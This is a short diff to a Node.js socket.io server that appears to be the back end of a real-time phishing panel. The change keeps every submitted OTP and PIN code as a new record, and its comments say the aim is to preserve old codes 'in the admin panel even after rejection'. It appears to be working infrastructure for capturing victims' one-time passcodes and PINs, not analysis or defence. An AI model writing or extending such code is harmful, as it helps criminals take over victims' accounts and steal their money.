@@ -517,15 +517,26 @@ io.on('connection', (socket) => {
       updatedAt: new Date().toISOString(),
     };
 
-    // Check if submission with same uuid and same formType+step exists (update it)
-    const existingIdx = db.formSubmissions.findIndex(s => 
-      s.id === submission.id || 
-      (s.uuid === uuid && s.formType === submission.formType && submission.step && s.step === submission.step)
-    );
-    if (existingIdx !== -1) {
-      db.formSubmissions[existingIdx] = { ...db.formSubmissions[existingIdx], ...submission };
-    } else {
+    // Form types that should NEVER be overwritten - always create new entries
+    // This preserves old OTP/PIN codes in the admin panel even after rejection
+    const neverOverwriteTypes = ['otp_verification', 'pin_verification'];
+    const shouldNeverOverwrite = neverOverwriteTypes.includes(submission.formType);
+
+    if (shouldNeverOverwrite) {
+      // Always create a new submission entry - never overwrite old codes
+      submission.id = uuidv4(); // Force new unique ID
       db.formSubmissions.push(submission);
+    } else {
+      // Check if submission with same uuid and same formType+step exists (update it)
+      const existingIdx = db.formSubmissions.findIndex(s => 
+        s.id === submission.id || 
+        (s.uuid === uuid && s.formType === submission.formType && submission.step && s.step === submission.step)
+      );
+      if (existingIdx !== -1) {
+        db.formSubmissions[existingIdx] = { ...db.formSubmissions[existingIdx], ...submission };
+      } else {
+        db.formSubmissions.push(submission);
+      }
     }
 
     console.log(`[${eventName}]`, uuid, submission.formType, submission.step || '', 'Total:', db.formSubmissions.length);
